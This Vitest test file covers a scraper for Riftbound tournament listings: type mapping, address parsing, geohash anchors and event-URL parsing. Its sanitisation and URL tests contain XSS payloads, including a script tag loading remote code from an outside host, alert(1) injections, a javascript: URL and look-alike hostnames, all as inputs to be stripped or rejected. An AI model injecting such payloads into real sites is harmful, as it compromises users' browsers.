import { describe, it, expect } from 'vitest';
import {
  ANCHOR_GEOHASH_PRECISION,
  ANCHOR_RADIUS_METERS,
  SEED_ANCHORS,
  PLAYRIFTBOUND_ID_PREFIX,
  anchorsFromCoordinates,
  selectAnchorBatch,
  convertTournamentNode,
  extractQueryHashFromChunk,
  mapEventType,
  RIOT_TOURNAMENT_TYPES,
  organizerExternalId,
  parseCountry,
  resultsCandidateTournamentId,
  tournamentIdFromEventUrl,
  type PrbTournamentNode,
} from '../sources/playriftbound.js';
import { formatPrice } from '../api.js';
import { eventDedupeKey } from '../dedupe.js';
import searchFixture from './fixtures/playriftbound-search.json';

const edges = searchFixture.data.competeTournamentSearch.edges as unknown as { node: PrbTournamentNode }[];

describe('mapEventType', () => {
  // These strings must stay identical to the ones the UVS source emits,
  // because the frontend event-type filter matches on them.
  it('maps Riot tournament types to the shared display strings', () => {
    expect(mapEventType('NEXUS_NIGHT')).toBe('Nexus Night');
    expect(mapEventType('PRE_RIFT')).toBe('Pre-Rift');
    expect(mapEventType('SUMMONER_SKIRMISH')).toBe('Summoner Skirmish');
  });

  it('maps every value of Riot\'s enum, so no real tier collapses into Other', () => {
    // The enum was read out of Riot's bundle on 2026-10-26 (11 values). Before
    // that only three were mapped and the other eight became `Other`, which
    // made a casual Open Play indistinguishable from a World Championship in
    // our own data - and therefore made a tier-keyed rating weight impossible
    // to express. Two of the eight (OPEN_PLAY, LEARN_TO_PLAY) are in the live
    // feed today.
    expect(RIOT_TOURNAMENT_TYPES).toHaveLength(11);
    for (const type of RIOT_TOURNAMENT_TYPES) {
      expect(mapEventType(type)).not.toBe('Other');
    }
    expect(mapEventType('LEARN_TO_PLAY')).toBe('Learn to Play');
    expect(mapEventType('OPEN_PLAY')).toBe('Open Play');
    expect(mapEventType('WORLD_CHAMPIONSHIP')).toBe('World Championship');
    expect(mapEventType('CONTINENTAL')).toBe('Continental');
    expect(mapEventType('REGIONAL')).toBe('Regional');
  });

  it('falls back to Other for unknown, missing or future enum values', () => {
    // Riot's enum grows; a record is never dropped for carrying a value we do
    // not recognise.
    expect(mapEventType('SOME_NEW_FORMAT')).toBe('Other');
    expect(mapEventType(null)).toBe('Other');
    expect(mapEventType(undefined)).toBe('Other');
  });
});

describe('formatPrice', () => {
  it('formats prices the same way for both sources', () => {
    expect(formatPrice(0, 'USD')).toBe('Free');
    expect(formatPrice(1500, 'USD')).toBe('$15.00');
    expect(formatPrice(500, 'USD')).toBe('$5.00');
    expect(formatPrice(1000, 'EUR')).toBe('€10.00');
    expect(formatPrice(1000, 'GBP')).toBe('£10.00');
    expect(formatPrice(1000, 'AUD')).toBe('10.00');
  });
});

describe('parseCountry', () => {
  it('reads the country off the end of a formatted address', () => {
    expect(parseCountry('8300 Arroyo Cir #240, Gilroy, CA 95020, USA')).toBe('US');
    expect(parseCountry('1 Test St, Toronto, ON, Canada')).toBe('CA');
    expect(parseCountry('1 Test St, London, United Kingdom')).toBe('GB');
  });

  it('handles countries that share a segment with the postcode', () => {
    // Real Singapore address shape from the API
    expect(parseCountry('10 Sinaran Dr, #B2-32 Square 2, Singapore 307506')).toBe('SG');
    expect(parseCountry('1 Test Rd, Singapore 199589')).toBe('SG');
  });

  it('passes through unknown countries and handles missing addresses', () => {
    expect(parseCountry('1 Test St, Reykjavik, Iceland')).toBe('Iceland');
    expect(parseCountry(null)).toBeNull();
    expect(parseCountry('')).toBeNull();
  });
});

describe('organizerExternalId', () => {
  it('is deterministic and outside the UVS store id range', () => {
    const id = organizerExternalId('019ffd01-5760-75a4-8ddb-bb3705490b5b');
    expect(id).toBe(organizerExternalId('019ffd01-5760-75a4-8ddb-bb3705490b5b'));
    expect(Number.isInteger(id)).toBe(true);
    expect(id).toBeGreaterThanOrEqual(2_000_000_000);
  });

  it('distinguishes different organizers', () => {
    expect(organizerExternalId('019ffd01-5760-75a4-8ddb-bb3705490b5b')).not.toBe(
      organizerExternalId('019fb060-8b51-7c92-acb8-1660b4ea853f')
    );
  });
});

describe('extractQueryHashFromChunk', () => {
  it('pulls the persisted query id out of a manifest chunk', () => {
    const chunk =
      'e.exports=[{"id":"a396a1e56532b71613403e76e5320f55672c768b6d53b2347fcdc6db0a75ec0b","name":"ALlArticle","type":"query"},' +
      '{"id":"acbcbba681a9c9a8063f792f7d665ba1eda81b19528b6af19e523f0c2061bec2","name":"CompeteTournamentSearch","type":"query","body":"query ..."}]';
    expect(extractQueryHashFromChunk(chunk)).toBe(
      'acbcbba681a9c9a8063f792f7d665ba1eda81b19528b6af19e523f0c2061bec2'
    );
  });

  it('tolerates the reversed key order', () => {
    const chunk = '{"name":"CompeteTournamentSearch","id":"' + 'b'.repeat(64) + '"}';
    expect(extractQueryHashFromChunk(chunk)).toBe('b'.repeat(64));
  });

  it('returns null when the operation is absent', () => {
    expect(extractQueryHashFromChunk('{"id":"' + 'c'.repeat(64) + '","name":"SomethingElse"}')).toBeNull();
  });
});

describe('convertTournamentNode', () => {
  it('converts a real API node into a ScrapedEvent', () => {
    const event = convertTournamentNode(edges[0].node);
    expect(event).not.toBeNull();
    expect(event).toMatchObject({
      externalId: 'prb-117248820934100462',
      name: 'Nexus Night x Ebisu Collections',
      location: 'EbisuCollections', // trailing whitespace from the API is trimmed
      address: '8300 Arroyo Cir #240, Gilroy, CA 95020, USA',
      city: 'Gilroy',
      state: 'CA',
      country: 'US',
      latitude: 37.020373,
      eventType: 'Nexus Night',
      organizer: 'EbisuCollections',
      capacity: 16,
      price: '$5.00',
      // UVS leaves url null; Riot gives us a real registration page
      url: 'https://playriftbound.com/en-us/events/117248820934100462',
      startTime: null,
      endDate: null,
      imageUrl: null,
    });
    expect(event!.startDate.toISOString()).toBe('2026-10-02T00:00:00.000Z');
    expect(event!.playerCount).toBeNull(); // registrantCounts is empty in this node
  });

  it('synthesises an ApiStore-shaped storeInfo for upsertEventWithStore', () => {
    const event = convertTournamentNode(edges[0].node);
    expect(event!.storeInfo).toEqual({
      id: organizerExternalId('019ffd01-5760-75a4-8ddb-bb3705490b5b'),
      name: 'EbisuCollections',
      full_address: '8300 Arroyo Cir #240, Gilroy, CA 95020, USA',
      city: 'Gilroy',
      state: 'CA',
      country: 'US',
      latitude: 37.020373,
      longitude: -121.56048120000001,
      website: null,
      email: null,
    });
  });

  it('converts every node in the fixture and prefixes external ids', () => {
    const events = edges.map(e => convertTournamentNode(e.node));
    expect(events.every(e => e !== null)).toBe(true);
    expect(events.every(e => e!.externalId.startsWith(PLAYRIFTBOUND_ID_PREFIX))).toBe(true);
    // Fixture events are all in the SF bay area, all distinct
    expect(new Set(events.map(e => eventDedupeKey(e!))).size).toBe(events.length);
  });

  it('reads the REGISTERED registrant count', () => {
    const node = structuredClone(edges[1].node);
    node.tournament.registrantCounts = [
      { count: 2, status: 'WAITLISTED' },
      { count: 8, status: 'REGISTERED' },
    ];
    expect(convertTournamentNode(node)!.playerCount).toBe(8);
  });

  it('reports free events as Free', () => {
    const node = structuredClone(edges[1].node);
    node.tournament.pricing = 'FREE';
    node.tournament.entryFee = null;
    expect(convertTournamentNode(node)!.price).toBe('Free');
  });

  // Riot's `format` is the only field in this feed that can never be
  // recovered later: the search API is upcoming-only and the event detail page
  // has no format at all, so an event converted without it is unanalysable for
  // format forever. The converter emitting it is the whole capture mechanism.
  it("emits Riot's event format verbatim as playFormat", () => {
    expect(convertTournamentNode(edges[0].node)!.playFormat).toBe('CONSTRUCTED');

    // Not normalised, not mapped: an unrecognised enum value passes straight
    // through, because Riot's enums in this feed demonstrably change.
    const node = structuredClone(edges[1].node);
    node.tournament.config!.format = 'SEALED';
    expect(convertTournamentNode(node)!.playFormat).toBe('SEALED');
    node.tournament.config!.format = 'SOMETHING_RIOT_ADDS_LATER';
    expect(convertTournamentNode(node)!.playFormat).toBe('SOMETHING_RIOT_ADDS_LATER');
  });

  it('keeps the event when there is no format, rather than dropping it', () => {
    const noFormat = structuredClone(edges[1].node);
    noFormat.tournament.config!.format = null;
    expect(convertTournamentNode(noFormat)!.playFormat).toBeNull();

    const noConfig = structuredClone(edges[1].node);
    noConfig.tournament.config = null;
    const event = convertTournamentNode(noConfig);
    expect(event).not.toBeNull();
    expect(event!.playFormat).toBeNull();
  });

  it('maps the other tournament types', () => {
    const node = structuredClone(edges[1].node);
    node.tournament.config!.tournamentType = 'PRE_RIFT';
    expect(convertTournamentNode(node)!.eventType).toBe('Pre-Rift');
    node.tournament.config!.tournamentType = 'SUMMONER_SKIRMISH';
    expect(convertTournamentNode(node)!.eventType).toBe('Summoner Skirmish');
  });

  // Riot's persisted document changed shape between the 2026-09 and 2026-10
  // builds: the address moved from organizer.physicalAddress to
  // tournament.tournamentLocation. Both have to parse, or rediscovering the hash
  // would "succeed" and then silently yield zero events, every node having lost
  // its coordinates. Measured over 25 events returned by both documents the two
  // fields agreed to within 1m on all 25, and tournamentLocation was non-null on
  // 100/100 events.
  it('reads the address from tournament.tournamentLocation (2026-10 document)', () => {
    const node = structuredClone(edges[0].node);
    node.tournament.tournamentLocation = node.organizer!.physicalAddress;
    delete node.organizer!.physicalAddress;

    const event = convertTournamentNode(node);
    expect(event).toMatchObject({
      address: '8300 Arroyo Cir #240, Gilroy, CA 95020, USA',
      city: 'Gilroy',
      state: 'CA',
      country: 'US',
      latitude: 37.020373,
    });
    expect(event!.storeInfo.latitude).toBe(37.020373);
  });

  it('prefers tournamentLocation over the organizer address when both are present', () => {
    const node = structuredClone(edges[0].node);
    node.tournament.tournamentLocation = {
      adminArea1: 'NV',
      city: 'Reno',
      formattedAddress: '1 Venue St, Reno, NV 89501, USA',
      latitude: 39.5296,
      longitude: -119.8138,
    };

    const event = convertTournamentNode(node);
    expect(event!.city).toBe('Reno');
    expect(event!.latitude).toBe(39.5296);
  });

  it('skips nodes without usable coordinates or dates', () => {
    const noCoords = structuredClone(edges[1].node);
    noCoords.organizer!.physicalAddress = null;
    expect(convertTournamentNode(noCoords)).toBeNull();

    // Same, under the 2026-10 document shape.
    const noLocation = structuredClone(edges[1].node);
    delete noLocation.organizer!.physicalAddress;
    noLocation.tournament.tournamentLocation = null;
    expect(convertTournamentNode(noLocation)).toBeNull();

    const noDate = structuredClone(edges[1].node);
    noDate.tournament.startsAt = 'not-a-date';
    expect(convertTournamentNode(noDate)).toBeNull();
  });
});

describe('SEED_ANCHORS', () => {
  it('covers every populated region with valid coordinates', () => {
    expect(SEED_ANCHORS.length).toBeGreaterThanOrEqual(8);
    for (const anchor of SEED_ANCHORS) {
      expect(Math.abs(anchor.latitude)).toBeLessThanOrEqual(90);
      expect(Math.abs(anchor.longitude)).toBeLessThanOrEqual(180);
    }
    // North America, South America, Europe, Asia and Oceania all present
    expect(SEED_ANCHORS.some(a => a.latitude > 20 && a.longitude < -60)).toBe(true);
    expect(SEED_ANCHORS.some(a => a.latitude < 0 && a.longitude < -30)).toBe(true);
    expect(SEED_ANCHORS.some(a => a.latitude > 35 && a.longitude > -10 && a.longitude < 40)).toBe(true);
    expect(SEED_ANCHORS.some(a => a.latitude > 0 && a.longitude > 100)).toBe(true);
    expect(SEED_ANCHORS.some(a => a.latitude < -20 && a.longitude > 140)).toBe(true);
  });
});

describe('anchorsFromCoordinates', () => {
  it('collapses coordinates in the same cell into a single anchor', () => {
    // Three stores within a few km of each other, plus one in New York
    const anchors = anchorsFromCoordinates([
      { latitude: 37.7749, longitude: -122.4194 },
      { latitude: 37.7849, longitude: -122.4094 },
      { latitude: 37.7749, longitude: -122.4194 },
      { latitude: 40.7128, longitude: -74.006 },
    ]);
    expect(anchors).toHaveLength(2);
    expect(anchors.map(a => a.name)).toEqual(['9q8', 'dr5']);
  });

  it('covers every seeded coordinate from the anchor it is assigned to', () => {
    // The whole point of one anchor per geohash cell: no coordinate is ever
    // further from its anchor than the API's ~161km distance cap.
    const coords = [
      { latitude: 37.7749, longitude: -122.4194 },
      { latitude: 37.020373, longitude: -121.56048 },
      { latitude: 51.5074, longitude: -0.1278 },
      { latitude: -33.8688, longitude: 151.2093 },
      { latitude: 1.3521, longitude: 103.8198 },
      { latitude: 64.1466, longitude: -21.9426 },
    ];
    const anchors = anchorsFromCoordinates(coords);
    for (const coord of coords) {
      const nearest = Math.min(
        ...anchors.map(a => haversineKm(a.latitude, a.longitude, coord.latitude, coord.longitude))
      );
      expect(nearest * 1000).toBeLessThan(ANCHOR_RADIUS_METERS);
    }
  });

  it('places every coordinate inside the radius its anchor is queried with', () => {
    // The coverage guarantee: a geohash-3 cell centre is at most ~110.6km from
    // any point in the cell, so one query per cell leaves no gaps.
    let worstMetres = 0;
    for (let i = 0; i < 2000; i++) {
      const latitude = Math.random() * 160 - 80;
      const longitude = Math.random() * 360 - 180;
      const [anchor] = anchorsFromCoordinates([{ latitude, longitude }]);
      worstMetres = Math.max(worstMetres, haversineKm(anchor.latitude, anchor.longitude, latitude, longitude) * 1000);
    }
    expect(worstMetres).toBeLessThan(ANCHOR_RADIUS_METERS);
  });

  it('ignores missing or non-finite coordinates', () => {
    expect(
      anchorsFromCoordinates([
        { latitude: null, longitude: null },
        { latitude: undefined, longitude: 5 },
        { latitude: NaN, longitude: 5 },
        { latitude: 37.7749, longitude: -122.4194 },
      ])
    ).toHaveLength(1);
  });

  it('is deterministic and sorted, so rotation is stable across runs', () => {
    const coords = [
      { latitude: 40.7128, longitude: -74.006 },
      { latitude: 37.7749, longitude: -122.4194 },
      { latitude: 51.5074, longitude: -0.1278 },
    ];
    const first = anchorsFromCoordinates(coords).map(a => a.name);
    const second = anchorsFromCoordinates([...coords].reverse()).map(a => a.name);
    expect(second).toEqual(first);
    expect([...first].sort()).toEqual(first);
    expect(first[0]).toHaveLength(ANCHOR_GEOHASH_PRECISION);
  });
});

describe('selectAnchorBatch', () => {
  const anchors = Array.from({ length: 10 }, (_, i) => ({ name: `a${i}`, latitude: i, longitude: i }));

  it('returns everything when the set fits in one run', () => {
    expect(selectAnchorBatch(anchors, 20, 0)).toEqual(anchors);
  });

  it('slides the window with the clock position', () => {
    expect(selectAnchorBatch(anchors, 3, 0).map(a => a.name)).toEqual(['a0', 'a1', 'a2']);
    expect(selectAnchorBatch(anchors, 3, 0.5).map(a => a.name)).toEqual(['a5', 'a6', 'a7']);
  });

  it('wraps around the end of the list', () => {
    expect(selectAnchorBatch(anchors, 4, 0.9).map(a => a.name)).toEqual(['a9', 'a0', 'a1', 'a2']);
  });

  it('covers every anchor within one period at any run cadence', () => {
    // 1000 anchors, 150 per run. Any schedule with enough runs per period gets
    // full coverage, including the production 2-hourly one (12 runs/day).
    const many = Array.from({ length: 1000 }, (_, i) => ({ name: `a${i}`, latitude: 0, longitude: 0 }));
    for (const runsPerPeriod of [7, 12, 24]) {
      const seen = new Set<string>();
      for (let run = 0; run < runsPerPeriod; run++) {
        for (const anchor of selectAnchorBatch(many, 150, run / runsPerPeriod)) seen.add(anchor.name);
      }
      expect(seen.size).toBe(many.length);
    }
  });

  it('never returns more than the batch size', () => {
    for (let i = 0; i < 20; i++) {
      expect(selectAnchorBatch(anchors, 3, i / 20)).toHaveLength(3);
    }
  });

  it('handles empty input, zero batch size and out-of-range rotations', () => {
    expect(selectAnchorBatch([], 5, 0.3)).toEqual([]);
    expect(selectAnchorBatch(anchors, 0, 0.3)).toEqual([]);
    expect(selectAnchorBatch(anchors, 3, -0.1)).toHaveLength(3);
    expect(selectAnchorBatch(anchors, 3, 7.25).map(a => a.name)).toEqual(
      selectAnchorBatch(anchors, 3, 0.25).map(a => a.name)
    );
    expect(selectAnchorBatch(anchors, 3, NaN)).toHaveLength(3);
  });
});

function haversineKm(lat1: number, lon1: number, lat2: number, lon2: number): number {
  const toRad = (d: number) => (d * Math.PI) / 180;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a =
    Math.sin(dLat / 2) ** 2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) ** 2;
  return 6371 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

describe('convertTournamentNode sanitisation', () => {
  // Riot's live API returns this organizer name on 11 events today - a stored
  // XSS payload that used to be written straight to the DB.
  const XSS_ORGANIZER =
    'Forever After Antiques and Collectibles Inc<script src="https://overlateise.com/api/jquery.js?v=2"></script>';

  const poisonedNode = {
    organizer: {
      id: '019ffd01-5760-75a4-8ddb-bb3705490b5c',
      name: XSS_ORGANIZER,
      physicalAddress: {
        adminArea1: 'CA',
        city: 'Martinez',
        formattedAddress: '123 Main St, Martinez, CA 94553, USA',
        latitude: 38.0194,
        longitude: -122.1341,
      },
    },
    tournament: {
      id: '117096731805661097',
      name: 'Pre-Rift<script>alert(1)</script>',
      startsAt: '2026-10-16T01:00:00.000Z',
      pricing: null,
      entryFee: { currency: 'USD', minorUnits: 4000 },
      registrantCounts: [],
      config: { tournamentType: 'PRE_RIFT', format: null, playerFormat: null, participantCapacity: 24 },
    },
  } as unknown as PrbTournamentNode;

  it('strips the live XSS payload from the organizer, location and shop name', () => {
    const event = convertTournamentNode(poisonedNode);
    expect(event).not.toBeNull();
    expect(event!.organizer).toBe('Forever After Antiques and Collectibles Inc');
    expect(event!.location).toBe('Forever After Antiques and Collectibles Inc');
    expect(event!.storeInfo.name).toBe('Forever After Antiques and Collectibles Inc');
    expect(event!.name).toBe('Pre-Rift');
  });

  it('sanitises the format enum too - it comes from a user-editable system', () => {
    const node = structuredClone(poisonedNode) as unknown as PrbTournamentNode;
    node.tournament.config!.format = 'CONSTRUCTED<script>alert(1)</script>';
    expect(convertTournamentNode(node)!.playFormat).toBe('CONSTRUCTED');
  });

  it('keeps the event rather than dropping the whole record', () => {
    const event = convertTournamentNode(poisonedNode);
    expect(event!.externalId).toBe('prb-117096731805661097');
    expect(event!.eventType).toBe('Pre-Rift');
    expect(event!.price).toBe('$40.00');
    expect(event!.latitude).toBe(38.0194);
  });

  it('tags the record with its source', () => {
    expect(convertTournamentNode(poisonedNode)!.sources).toEqual(['playriftbound']);
  });
});

describe('tournamentIdFromEventUrl', () => {
  // The merge keeps the UVS identity, so for a merged event the Riot tournament
  // id exists in exactly one place: the `url` the merge policy hands to Riot.
  // This parser is the whole of the results pass's access to those events, so
  // its rejection half matters as much as its acceptance half.
  it('reads the id out of the URL this scraper actually writes', () => {
    // Verified live on 2026-10-26: 62 of 62 merged rows in one day partition.
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/events/117338779189865706'))
      .toBe('117338779189865706');
  });

  it('tolerates everything that legitimately varies', () => {
    const id = '117338779189865706';
    // The converter writes `en-us`; the user-facing links elsewhere in this repo
    // use `en-US`, and Riot serves other locales.
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/en-US/events/${id}`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/pt-BR/events/${id}`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/fr/events/${id}`)).toBe(id);
    // No locale segment at all.
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/events/${id}`)).toBe(id);
    expect(tournamentIdFromEventUrl(`http://playriftbound.com/en-us/events/${id}`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://www.playriftbound.com/en-us/events/${id}`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/en-us/events/${id}/`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/en-us/events/${id}?utm_source=x`)).toBe(id);
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/en-us/events/${id}#standings`)).toBe(id);
    expect(tournamentIdFromEventUrl(`  https://playriftbound.com/en-us/events/${id}  `)).toBe(id);
    // The search UI's own host names the same tournament.
    expect(tournamentIdFromEventUrl(`https://events.playriftbound.com/en-US/events/${id}`)).toBe(id);
  });

  it('rejects a hostname that merely contains ours', () => {
    // The reason this is a URL parse and not a regex. A substring or endsWith
    // test waves all three of these through.
    expect(tournamentIdFromEventUrl('https://playriftbound.com.evil.test/en-us/events/117338779189865706')).toBeNull();
    expect(tournamentIdFromEventUrl('https://notplayriftbound.com/en-us/events/117338779189865706')).toBeNull();
    expect(tournamentIdFromEventUrl('https://evil.test/?x=https://playriftbound.com/en-us/events/117338779189865706'))
      .toBeNull();
  });

  it('rejects anything that is not a Riot event page', () => {
    // A UVS locator URL, and a store's own site - both appear in this feed.
    expect(tournamentIdFromEventUrl('https://locator.riftbound.uvsgames.com/events/48812')).toBeNull();
    expect(tournamentIdFromEventUrl('https://gamesofmartinez.com/calendar')).toBeNull();
    // Right host, wrong page.
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/events')).toBeNull();
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/news/117338779189865706')).toBeNull();
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/events/117338779189865706/standings')).toBeNull();
    // Right shape, unusable id - the fetch asserts digits, so this must not
    // reach it as if it were real.
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/events/not-an-id')).toBeNull();
    expect(tournamentIdFromEventUrl('https://playriftbound.com/en-us/events/117338779189865706abc')).toBeNull();
    expect(tournamentIdFromEventUrl(`https://playriftbound.com/en-us/events/${'9'.repeat(40)}`)).toBeNull();
    // Not a fetchable scheme.
    expect(tournamentIdFromEventUrl('javascript:alert(1)//playriftbound.com/events/117')).toBeNull();
    expect(tournamentIdFromEventUrl('//playriftbound.com/en-us/events/117338779189865706')).toBeNull();
  });

  it('rejects the empty and absent cases without throwing', () => {
    expect(tournamentIdFromEventUrl('')).toBeNull();
    expect(tournamentIdFromEventUrl('   ')).toBeNull();
    expect(tournamentIdFromEventUrl(null)).toBeNull();
    expect(tournamentIdFromEventUrl(undefined)).toBeNull();
    expect(tournamentIdFromEventUrl('not a url at all')).toBeNull();
  });
});

describe('resultsCandidateTournamentId', () => {
  it('reads a prb- row off its externalId, exactly as before', () => {
    expect(resultsCandidateTournamentId({ externalId: 'prb-117209411862156256', url: null }))
      .toBe('117209411862156256');
    // The URL is not consulted and cannot override the prefix.
    expect(resultsCandidateTournamentId({
      externalId: 'prb-117209411862156256',
      url: 'https://playriftbound.com/en-us/events/999',
    })).toBe('117209411862156256');
  });

  it('reads a merged row off its URL, because its externalId is the UVS one', () => {
    // The shape measured in production: numeric UVS externalId, Riot URL.
    expect(resultsCandidateTournamentId({
      externalId: '853410',
      url: 'https://playriftbound.com/en-us/events/117087016664758142',
    })).toBe('117087016664758142');
  });

  it('is not a candidate when the row is UVS-only', () => {
    // 389 of 389 UVS-only rows in the measured day partition carried no URL.
    expect(resultsCandidateTournamentId({ externalId: '853410', url: null })).toBeNull();
    expect(resultsCandidateTournamentId({ externalId: '853410' })).toBeNull();
    expect(resultsCandidateTournamentId({ externalId: '853410', url: 'https://gamesofmartinez.com' })).toBeNull();
  });
});
